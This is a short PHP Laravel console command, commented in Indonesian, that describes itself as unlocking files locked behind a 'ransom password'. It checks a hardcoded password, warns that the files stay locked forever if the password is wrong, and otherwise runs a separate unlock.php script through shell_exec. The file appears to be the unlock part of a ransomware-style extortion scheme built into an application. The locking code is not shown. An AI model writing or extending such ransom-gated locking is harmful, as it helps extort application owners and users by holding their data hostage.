<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;

class UnlockApp extends Command
{
    protected $signature = 'unlock {password}';
    protected $description = 'Buka semua file yang terkunci (password tebusan)';

    public function handle()
    {
        $input = $this->argument('password');

        // GANTI INI kalau ganti password
        $correct = 'cat2025rahasia';

        if ($input !== $correct) {
            $this->error('Password salah! File tetap terkunci selamanya... (atau coba lagi)');
            return;
        }

        // Langsung jalankan unlocker dengan password benar
        $result = shell_exec('php ' . base_path('unlock.php') . ' <<< ' . escapeshellarg($correct));

        $this->info("Unlock berhasil!\n" . $result);
    }
}
